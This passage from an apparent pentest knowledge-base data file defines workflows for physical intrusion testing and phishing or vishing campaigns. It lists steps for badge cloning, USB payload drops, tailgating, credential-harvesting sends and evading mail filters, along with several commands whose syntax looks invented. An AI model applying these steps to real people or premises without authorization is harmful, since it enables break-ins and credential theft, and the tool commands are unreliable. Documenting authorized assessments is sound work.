    "details": "Use this when assessing physical controls and employee response. Includes pretext planning, onsite execution, payload tracking, and evidence handling.",
    "installation_guides": [
        {
            "platform": "Prerequisites",
            "summary": "Equipment pack",
            "steps": [
                {"detail": "Prepare cloned badges, lock tools, hidden cameras", "copyable": False},
                {"detail": "Stage payload media with payload delivery tracking (Canarytokens)", "copyable": False},
                {"detail": "Load PT Journal field template on mobile device", "copyable": False}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Payload prep", "command": "python3 dropper.py --template usb --token canary_id", "notes": []},
        {"description": "Badge clone test", "command": "proxmark3 rdv4 clone -t HID -f card_dump", "notes": []}
    ],
    "step_sequences": [
        {
            "title": "Pretext planning",
            "steps": [
                {"title": "Recon", "details": "Collect building maps and shift changes.", "command": "maltego workspace --export facilities"},
                {"title": "Payload creation", "details": "Generate benign malware demo.", "command": "msfvenom -p windows/x64/messagebox TITLE='Drill' TEXT='Do not run unknown USBs' -f exe > reminder.exe"},
                {"title": "Authorization", "details": "Ensure ROE letters onsite.", "command": "# Print authorization"}
            ]
        },
        {
            "title": "Onsite execution",
            "steps": [
                {"title": "Entry attempt", "details": "Tailgate or use cloned badge.", "command": "# Document with bodycam"},
                {"title": "Drop payload", "details": "Leave USB with Canary token at strategic locations.", "command": "python3 dropper.py --deploy"},
                {"title": "Monitor alerts", "details": "Review Canary token hits and SOC responses.", "command": "curl https://canary/api/events"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Physical engagement timeline",
            "stages": [
                {"label": "Day 0", "description": "Recon + logistics.", "command": "# Prep badges"},
                {"label": "Day 1", "description": "Initial entry attempts.", "command": "# Execute onsite"},
                {"label": "Day 2", "description": "Payload drop + monitoring.", "command": "# Deploy USB"},
                {"label": "Day 3", "description": "Interviews + social engineering.", "command": "# Conduct debrief"},
                {"label": "Day 4", "description": "Reporting + evidence handoff.", "command": "# PT Journal physical report"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "Canary fired", "meaning": "Employee interacted with payload.", "severity": "High"},
        {"indicator": "Badge clone success", "meaning": "Physical access control weakness.", "severity": "High"},
        {"indicator": "Security challenge logged", "meaning": "Staff followed procedure.", "severity": "Low"}
    ],
    "advanced_usage": [
        {"title": "RF tracking", "command": "espresense-cli log", "scenario": "Track payload location via BLE beacons.", "notes": ["Use when environment allows"]},
        {"title": "Malware telemetry", "command": "canarytokens --list", "scenario": "Monitor which host executed dropper for timeline reconstruction.", "notes": ["Share only sanitized metadata"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "PTES physical guidelines", "url": "https://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Physical_Security_Testing", "description": "Reference"},
        {"label": "Canarytokens", "url": "https://canarytokens.org/", "description": "Payload tracking"},
        {"label": "Proxmark community", "url": "https://proxmark.com/", "description": "Badge cloning tips"}
    ]
}
updates['workflow_social_engineering_campaign'] = {
    "id": "workflow_social_engineering_campaign",
    "name": "Social Engineering Campaign Workflow",
    "summary": "Covers planning, execution, and reporting for phishing/vishing campaigns with metrics collection and escalation paths.",
    "details": "Follow this when executing scoped phishing or phone-based social engineering engagements. Includes approval checkpoints and employee awareness feedback loops.",
    "installation_guides": [
        {
            "platform": "Prerequisites",
            "summary": "Tooling",
            "steps": [
                {"detail": "Set up phishing platform (GoPhish/CampaignPhish)", "copyable": False},
                {"detail": "Provision unique domains + TLS certs", "copyable": False},
                {"detail": "Create PT Journal campaign template", "copyable": False}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Launch phishing server", "command": "gophish", "notes": []},
        {"description": "Send SMS phish", "command": "python3 sms_campaign.py --template reset --target targets.csv", "notes": []}
    ],
    "step_sequences": [
        {
            "title": "Planning",
            "steps": [
                {"title": "Define personas", "details": "Decide pretexts and scopes.", "command": "# PT Journal → Plan"},
                {"title": "Draft templates", "details": "Emails, landing pages, call scripts.", "command": "gophish templates --new"},
                {"title": "Approval", "details": "Client sign-off.", "command": "# Collect approval ticket"}
            ]
        },
        {
            "title": "Execution",
            "steps": [
                {"title": "Send campaigns", "details": "Emails/SMS/vishing.", "command": "gophish send --group employees"},
                {"title": "Monitor results", "details": "Track opens/credentials.", "command": "gophish results --campaign 5"},
                {"title": "Escalation", "details": "Notify client of critical hits.", "command": "# Follow ROE"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "SE campaign timeline",
            "stages": [
                {"label": "Week 1", "description": "Planning + content.", "command": "# Templates"},
                {"label": "Week 2", "description": "Pretext validation + pilot.", "command": "gophish test"},
                {"label": "Week 3", "description": "Full send + monitoring.", "command": "gophish send"},
                {"label": "Week 4", "description": "Metrics + training recommendations.", "command": "# PT Journal report"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "Click rate", "meaning": "Percentage of users clicking link.", "severity": "Info"},
        {"indicator": "Credential submission", "meaning": "High-risk response requiring immediate notice.", "severity": "High"},
        {"indicator": "Report to security", "meaning": "Positive behavior to highlight.", "severity": "Low"}
    ],
    "advanced_usage": [
        {"title": "Adaptive sending", "command": "gophish api throttle", "scenario": "Adjust pacing to avoid filters.", "notes": ["Use per SMTP guidance"]},
        {"title": "Voice call automation", "command": "python3 vish.py --twilio", "scenario": "Blend vishing with email follow-up.", "notes": ["Record consent"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "PTES social engineering", "url": "https://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Social_Engineering", "description": "Guidelines"},
        {"label": "Gophish docs", "url": "https://getgophish.com/documentation/", "description": "Platform help"},
        {"label": "NIST Phish training", "url": "https://csrc.nist.gov/publications/detail/sp/800-161a/final", "description": "Awareness programs"}
    ]
}
